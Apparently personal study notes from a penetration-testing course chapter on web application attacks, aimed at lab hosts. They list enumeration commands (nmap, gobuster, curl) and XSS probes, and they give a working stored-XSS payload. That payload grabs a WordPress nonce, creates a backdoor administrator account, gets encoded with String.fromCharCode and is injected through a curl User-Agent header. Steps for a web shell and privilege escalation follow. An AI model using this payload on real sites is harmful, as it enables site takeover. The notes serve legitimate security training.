### Chapter 8: Web App Attacks



-------- WEB APP ASSESSMENT ------------

/ FIngerprint
	1. nmap -sV to grab the banner
	2. nmap --script=htt-enum
// Tech Stack ID
	1. Wappalyzer
	2. Discover the OS, UI framework, web server, 
	jS libraries.
/// Directory Brute Force
	1. gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
/|/ Security Testing with Burp
	1. Repeater, Intruder
	
-------WEB APP ENUMERATION -----------

/ Address Bar
	- .php, .jsp, .do, .html
	- Less common because now frameworks support routes, mapping a URI to code.
// Firefox Debugger
	- Inspect page source and  resources
	- Review headers on Network tab
/// Enumerate API
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
curl -i http://192.168.50.16:5002/users/v1

javaScript:
console.log(atob(atob(atob(atob(atob(atob(atob(atob(atob(atob(atob(atob(atob(atob(atob("payload"))))))))))))))));

/|/ XSS
stored
reflected
dom

1. Find Entry Point
2. Try Special chars, observe any unfilitered output:
   < > ' " { } ;
3. PoC <script> alert('Pwned') </script>

|/ Priv Esc via XSS

1. Gather nonce 
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

2.  Create new backdoor admin accout
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

3. Run jsCompress

4. Encode the script
 function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)

5.Run the function from step 4 from the browser console

6. Copy the output to a curl request and launch the attack:
 curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(1...))</script>" --proxy 127.0.0.1:8080

7. Inspect the request from Burp on the way out

8. Embed a web shell

9. Upgrade the shell

10. Elevate Privileges



Convert code to URL parsed string:

https://www.martineve.com/2007/05/23/string-fromcharcode-encoder/

